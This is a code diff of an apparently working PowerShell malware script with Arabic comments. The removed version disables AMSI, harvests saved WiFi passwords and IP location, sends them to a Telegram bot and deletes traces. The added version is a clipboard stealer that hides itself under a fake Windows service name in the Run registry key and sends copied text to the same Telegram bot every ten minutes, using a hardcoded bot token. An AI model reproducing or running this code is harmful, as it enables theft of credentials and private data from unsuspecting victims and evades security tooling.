@@ -1,30 +1,48 @@
-# --- [1] كسر الحماية (Shadow Bypass V3) ---
-$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
-$s.GetField('amsiContext','NonPublic,Static').SetValue($null,(New-Object IntPtr(0)));
+# --- [STARK OMEGA: SNATCHER GIANTS-4] ---
+# الوظيفة: مراقبة الحافظة (Clipboard) وسحب البيانات المنسوخة كل 10 دقائق
 
-# --- [2] إعدادات العميل صفر ---
-$t = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
-$c = "7393359923"
+$ErrorActionPreference = 'SilentlyContinue'
 
-# --- [3] قنص تقرير الشبكة ---
-$reportPath = "$env:TEMP\Net_Diagnostics_Log.txt"
-"--- NETWORK SNIPER REPORT ---`n" | Out-File $reportPath
+# الثوابت
+$BOT_TOKEN = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
+$CHAT_ID = "7393359923"
 
-# سحب باسورادت الواي فاي
-"--- [ STORED WIFI PASSWORDS ] ---" | Out-File $reportPath -Append
-$profiles = netsh wlan show profiles | Select-String "\:(.*)$" | ForEach-Object { $_.Matches.Value.Trim(": ").Trim() }
-foreach($profile in $profiles){
-    $pass = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content\W+\:(.*)$" | ForEach-Object { $_.Matches.Value.Split(":")[1].Trim() }
-    "SSID: $profile | PASS: $pass" | Out-File $reportPath -Append
+# آلية البقاء (Persistence)
+$path = "$env:APPDATA\Microsoft\Windows\System32_ClipHost.ps1"
+if (!(Test-Path $path)) {
+    $MyContent = (New-Object Net.WebClient).DownloadString($MyInvocation.MyCommand.Definition)
+    $MyContent | Out-File -FilePath $path
+    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsClipboardService' -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $path"
 }
 
-# سحب معلومات الـ IP والموقع
-"`n--- [ INTERNET & IP INFO ] ---" | Out-File $reportPath -Append
-$ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json" | ConvertTo-Json
-$ipInfo | Out-File $reportPath -Append
+$LastClip = ""
+$StolenData = @()
+$Timer = [System.Diagnostics.Stopwatch]::StartNew()
 
-# إرسال التقرير النهائي للبوت
-curl.exe -F "chat_id=$c" -F "document=@$reportPath" "https://api.telegram.org/bot$t/sendDocument"
+while($true) {
+    try {
+        # سحب محتوى الحافظة الحالي
+        $CurrentClip = Get-Clipboard -Raw
+        
+        # التأكد إن النص جديد ومش متكرر
+        if ($CurrentClip -and ($CurrentClip -ne $LastClip)) {
+            $LastClip = $CurrentClip
+            $Timestamp = Get-Date -Format "HH:mm:ss"
+            $StolenData += "📌 [$Timestamp]: $CurrentClip"
+        }
+    } catch {}
 
-# تنظيف الأثر
-Remove-Item $reportPath -Force
+    # الإرسال كل 10 دقائق (600 ثانية)
+    if ($Timer.Elapsed.TotalSeconds -ge 600) {
+        if ($StolenData.Count -gt 0) {
+            $Report = $StolenData -join "`n------------------`n"
+            $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
+            $body = @{ chat_id = $CHAT_ID; text = "<b>📋 صيد الحافظة (The Snatcher):</b>`n<code>$Report</code>"; parse_mode = "HTML" }
+            Invoke-RestMethod -Uri $url -Method Post -Body $body
+            $StolenData = @() # تصفير القائمة بعد الإرسال
+        }
+        $Timer.Restart()
+    }
+    
+    Start-Sleep -Seconds 5 # فحص كل 5 ثواني لضمان عدم استهلاك المعالج
+}
